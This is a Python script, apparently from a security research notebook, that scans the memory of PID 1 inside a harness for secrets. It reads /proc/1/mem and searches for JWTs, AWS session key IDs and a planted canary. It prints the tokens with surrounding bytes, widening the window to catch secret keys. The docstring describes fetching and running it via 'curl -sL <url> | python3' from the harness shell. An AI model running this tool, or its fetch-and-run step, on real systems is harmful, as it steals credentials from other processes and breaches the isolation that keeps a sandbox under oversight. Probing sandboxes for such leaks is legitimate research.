"""Notebook-14 §4.4 — generic credential scan in PID 1's heap.

Sister probe to pid1_canary_scan.py. Instead of looking for the planted vault
canary, this script hunts for *anything that looks like a credential* in PID 1's
writable-private anonymous regions:

  - JWTs: any `eyJ...` substring with at least one `.` separator (header.payload[.signature])
  - AWS session tokens: any `ASIA[A-Z0-9]{16}` substring (IAM session AccessKeyId prefix)
  - The planted vault canary (kept for cross-correlation with pid1_canary_scan.py)

Reports each finding with a context window so the writeup can quote the surrounding
bytes (header dict structure, httpx connection state, etc.).

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_jwt_scan.py and fetched via
`curl -sL <url> | python3` from the harness shell.
"""
import os
import re
import sys


CANARY = b'IDENT-APIKEY-CANARY-9F3E2B1A-DO-NOT-USE'
# JWTs: header.payload, signature optional. eyJhbGciOi... is the typical RS256/HS256 prefix.
JWT_RE = re.compile(rb'eyJ[A-Za-z0-9_\-]{8,}\.[A-Za-z0-9_\-]{8,}(?:\.[A-Za-z0-9_\-]{8,})?')
# AWS session token AccessKeyIds (IAM/STS short-lived) start ASIA. 20 chars total.
ASIA_RE = re.compile(rb'ASIA[A-Z0-9]{16}')

MAX_BYTES = 16 * 1024 * 1024 * 1024  # effectively unbounded


def fingerprint(jwt_bytes):
    """Compress a JWT to its (header, payload-len, signature-tail) signature so
    repeat occurrences of the same token can be deduped without printing
    the entire 1k+ byte string each time."""
    parts = jwt_bytes.split(b'.')
    head = parts[0][:24].decode('latin-1', errors='replace')
    sig_tail = parts[-1][-12:].decode('latin-1', errors='replace') if len(parts) >= 2 else ''
    return f'eyJ_head={head}... sig_tail=...{sig_tail} len={len(jwt_bytes)} parts={len(parts)}'


def main():
    regions = []
    with open('/proc/1/maps', 'r') as f:
        for line in f:
            parts = line.split()
            if len(parts) < 5:
                continue
            addr_range, perms = parts[0], parts[1]
            path = parts[5] if len(parts) >= 6 else ''
            if not perms.startswith('rw-'):
                continue
            if path:
                continue
            try:
                start_s, end_s = addr_range.split('-')
                start = int(start_s, 16)
                end = int(end_s, 16)
            except Exception:
                continue
            regions.append((start, end, line.rstrip()))

    print(f'WRITABLE_PRIVATE_ANON_REGIONS={len(regions)}')
    if not regions:
        print('PROC1_MEM_READABLE=UNKNOWN (no writable regions)')
        return
    try:
        with open('/proc/1/mem', 'rb') as f:
            f.seek(regions[0][0])
            _ = f.read(16)
        print(f'PROC1_MEM_READABLE=YES (probed at {hex(regions[0][0])})')
    except Exception as e:
        print(f'PROC1_MEM_READABLE=NO ({type(e).__name__}: {e})')
        return

    total_bytes = 0
    canary_hits = 0
    jwt_uniques = {}   # fingerprint -> {region, occurrences, first_offset}
    asia_uniques = {}  # ASIA-id -> {region, occurrences, first_offset}

    with open('/proc/1/mem', 'rb') as mem:
        for start, end, raw_line in regions:
            size = end - start
            if total_bytes + size > MAX_BYTES:
                print(f'SCAN_BUDGET_EXHAUSTED at {total_bytes} bytes')
                break
            try:
                mem.seek(start)
                chunk = mem.read(size)
            except Exception:
                continue
            total_bytes += size

            # Canary
            if CANARY in chunk:
                idx = -1
                while True:
                    idx = chunk.find(CANARY, idx + 1)
                    if idx < 0:
                        break
                    canary_hits += 1

            # JWTs
            for m in JWT_RE.finditer(chunk):
                jwt_bytes = m.group(0)
                fp = fingerprint(jwt_bytes)
                rec = jwt_uniques.setdefault(fp, {
                    'region': raw_line, 'count': 0, 'first_offset': m.start(),
                    'first_window': None, 'sample_bytes': jwt_bytes,
                })
                rec['count'] += 1
                if rec['first_window'] is None:
                    ws = max(0, m.start() - 32)
                    we = min(len(chunk), m.end() + 32)
                    rec['first_window'] = chunk[ws:we]

            # AWS session tokens
            for m in ASIA_RE.finditer(chunk):
                key_id = m.group(0).decode('ascii')
                rec = asia_uniques.setdefault(key_id, {
                    'region': raw_line, 'count': 0, 'first_offset': m.start(),
                    'first_window': None,
                })
                rec['count'] += 1
                if rec['first_window'] is None:
                    ws = max(0, m.start() - 64)
                    we = min(len(chunk), m.end() + 128)  # extra to catch SecretAccessKey + SessionToken nearby
                    rec['first_window'] = chunk[ws:we]

    print()
    print(f'BYTES_SCANNED={total_bytes}')
    print(f'CANARY_OCCURRENCES={canary_hits}')
    print(f'JWT_UNIQUE_TOKENS={len(jwt_uniques)}')
    print(f'ASIA_UNIQUE_KEYS={len(asia_uniques)}')

    if jwt_uniques:
        print()
        print('=== JWT FINDINGS ===')
        for i, (fp, rec) in enumerate(jwt_uniques.items()):
            print(f'JWT[{i}] {fp}')
            print(f'  region: {rec["region"]}')
            print(f'  occurrences: {rec["count"]}  first_offset: {rec["first_offset"]}')
            print(f'  context: {rec["first_window"]!r}')
            # Print full bytes in a separate line for the writeup; truncate at 200 chars.
            sample = rec['sample_bytes']
            print(f'  sample (first 200 bytes): {sample[:200]!r}')
            print()

    if asia_uniques:
        print()
        print('=== AWS SESSION TOKEN FINDINGS ===')
        for key_id, rec in asia_uniques.items():
            print(f'ASIA AccessKeyId: {key_id}')
            print(f'  region: {rec["region"]}')
            print(f'  occurrences: {rec["count"]}  first_offset: {rec["first_offset"]}')
            print(f'  context: {rec["first_window"]!r}')
            print()


if __name__ == '__main__':
    main()
